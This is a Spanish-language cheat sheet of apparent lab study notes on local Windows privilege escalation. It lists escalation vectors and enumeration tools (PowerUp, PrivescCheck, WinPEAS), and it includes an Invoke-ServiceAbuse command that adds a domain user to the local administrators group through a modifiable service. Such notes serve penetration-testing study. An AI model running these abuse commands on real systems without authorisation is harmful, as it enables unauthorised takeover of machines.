# Privilege Escalation - Local 

Tags: #AD #Windows #Powershell #PowerUP #PrivEsc #WinPEAS #PrivEsc 

```bash 
Hay diferentes maneras de escalar privilegios localmente en Windows:

1. Parches faltantes 
2. Despliegue automatico y 'AutoLogon' password en texto claro 
3. AlwaysInstallElevated (Cualquier usuario puede correr MSI como SYSTEM)
4. Servicio mal configurados 
5. DLL Hijacking y mas 
6. Kerberos y NTLM relaying 
```

```powershell 
❯ Get-WmiObject -Class win32_service | select pathname 
❯ sc.exe sdshow snmptrap   
```

```powershell 
Problemas de servicios 

❯ Get-ServiceUnquoted -Verbose          # Obtener servicios con rutas entre comillas y un espacio en sus nombres 
❯ Get-ModifiableServiceFile -Verbose    # Obtener servicios donde el usuario actual puede escribir en su ruta binaria o cambiar los argumentos del binario 
❯ Get-ModifiableService -Verbose        # Obtener los servicios cuya configuración puede modificar el usuario actual 
```

## PowerUP

* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

```powershell
❯ Invoke-Allchecks
```

```powershell
# Si se encuentra un servicio corriendo en el escaneo de PowerUp y tiene estas caracteristicas (AbuseFunction, CanRestart y Check) de la siguiente manera, se podría abusar para escalar privilegios:

	ServiceName:  
	Path: 
	StartName: 
	AbuseFunction: Invoke-ServiceAbuse -Name 'ServiceName'
	CanRestart: True
	Name: 
	Check: Modifiable Services 

❯ help Invoke-ServiceAbuse      # Mirar ejemplos de los diferentes comandos 
❯ Invoke-ServiceAbuse -Name 'ServiceName' -Username "dcorp\user" -Verbose    # Agregar al usuario actual del dominio al grupo de administrador local 


Notas: 
	1. Se debe salir y volver a iniciar sesión
```

```powershell 
❯ . Find-PSRemotingLocalAdminAccess.ps1       # Importar el módulo 
❯ Find-PSRemotingLocalAdminAccess -Verbose    # Listar servidores del DC donde se tiene acceso administrativo local 
```

## Privesc 

* [Privesc](https://github.com/itm4n/PrivescCheck)

```powershell 
❯ Invoke-PrivEscCheck 
```

## WinPEAS 

* [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

```powershell 
❯ winPEASx64.exe    
```
